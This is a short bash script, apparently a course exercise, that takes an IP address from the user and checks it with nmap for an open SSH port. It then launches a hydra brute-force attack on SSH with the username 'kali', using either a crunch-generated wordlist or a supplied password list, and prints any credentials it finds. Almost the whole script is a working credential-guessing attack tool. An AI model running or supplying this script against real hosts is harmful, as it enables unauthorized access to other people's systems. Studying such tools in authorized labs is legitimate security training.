#!/bin/bash

#Create a script that will get from the user an IP
#a. Check if the SSH is open, and ask if to run BF attack
#b. Let the user choose if to use crunch or give a password list
#c. Print to the user if the password was found

echo "Which IP address would you like to brute force?"
read ipadd
NMAP=$(sudo nmap $ipadd -p ssh --open | grep '22/tcp')

if [ "$NMAP" != "" ]
then 
echo "There is an SSH connection!"
read -p "Would you like to run a brute-force attack?(Y/n) " bf
	if [ "$bf" == "n" ]
	then
	echo "Then this is where we end..."
	exit
	else
	read -p "Would you like to crunch or use a password list? (c/P) " CorP
		if [ "$CorP" == "c" ]
		then
		read -p "What's the min no. of chars? " min
		read -p "What's the max no. of chars? " max
		read -p "What characters would you like to use? " chars
		crunch $min $max $chars > crunchlist
		echo "Crunched! Now to bruteforce..."
		sudo hydra -l kali -P crunchlist $ipadd ssh > hydrash.txt
		echo "And here are the results!"
		RESULT=$(cat hydrash.txt | grep login)
			if [ "$RESULT" != "" ]
			then echo "$RESULT"
			else
			echo "Sorry, it didn't work out."
			exit
			fi
		else
		read -p "What is the name of the password list? " passwdlst
		sudo hydra -l kali -P $passwdlst $ipadd ssh > hydrash.txt
		echo "And here are the results!"
		RESULT=$(cat hydrash.txt | grep host)
			if [ -z "$RESULT" ]
			then echo "Sorry, it didn't work out"
			exit
			else echo "You were successful."
			echo "$RESULT"
			fi
		fi
	fi
else	echo "You can't SSH with this IP."
fi

